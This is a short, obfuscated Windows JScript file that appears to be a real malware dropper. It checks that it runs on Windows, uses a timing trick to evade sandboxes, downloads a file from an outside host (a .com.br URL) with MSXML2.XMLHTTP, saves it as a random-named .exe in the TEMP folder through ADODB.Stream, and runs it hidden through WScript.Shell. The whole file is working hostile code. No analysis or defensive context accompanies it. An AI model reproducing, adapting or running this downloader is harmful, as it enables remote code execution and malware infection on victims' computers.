var c = false;
var oL = "CreateObject";
var z = function o() {return WScript[oL]("WScript.Shell");}(), H = 11;
var pS = "MSXML2.XMLHTTP";
var p = 2123213;
var R = 0;
function F(Z){z["Run"](Z, R, R);};
function o0(){return "" + pS;};
function A(JI, H0){R = R * 1; return JI - H0;};
function n(){return oL;};
/*@cc_on
  @if (@_win32 || @_win64)
    c = true;
  @end
@*/
if (c)
{
var uA = "";
function vx(){return 22;};
var C = 0; var s = 0;
function UC()
{
var f = new this["Date"]();
var RT = f["getUTCMilliseconds"]();
WScript["Sleep"](vx());
var f = new this["Date"]();
var Y0 = f["getUTCMilliseconds"]();
WScript["Sleep"](vx());
var f = new this["Date"]();
var J = f["getUTCMilliseconds"]();
var C = "BP";
C = A(Y0, RT);
var s = "E";
s = A(J, Y0);
uA = "open";
return A(C, s);
}
var Uc = false;
var Ay = false;
for (var y = R; y < vx() * 1; y++){if (UC() != R){
Uc = true; 
s = "31" + 11 * C + s; 
Ay = true; 
break;
}}
function U() {return ((Uc == true) && (Uc == Ay)) ? 1 : R;};
if (Uc && U() && Ay){
function fT() {return z["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "HGBIwg4wm1qHm5eV.exe";};
 qc = o0();
 w = WScript[oL](qc);
 var V = 1;
 while (V){
try {
w[uA]("GET", "http://caferacerpneus.com.br/lw2osd", false);
w["send"]();
P = "Sleep";
for (;;){WScript[P](vx() * 11); if (w["readystate"] >= 2 * 2) break;};
V = R;
} catch(bB){};
}
function K(Vd) {var kN = (1, 2, 3, 4, 5, Vd); return kN;};
Ud = WScript[n()]("ADODB.Stream");
qc = Ud;
qc[uA]();
qc["type"] = K(1);
qc["write"](w["ResponseBody"]);
Ud["position"] = K(R);
qc["Save" + "ToFile"](fT(), 2);
Ud["c"+"lose"]();
Y = fT();
F(Y);
}
}

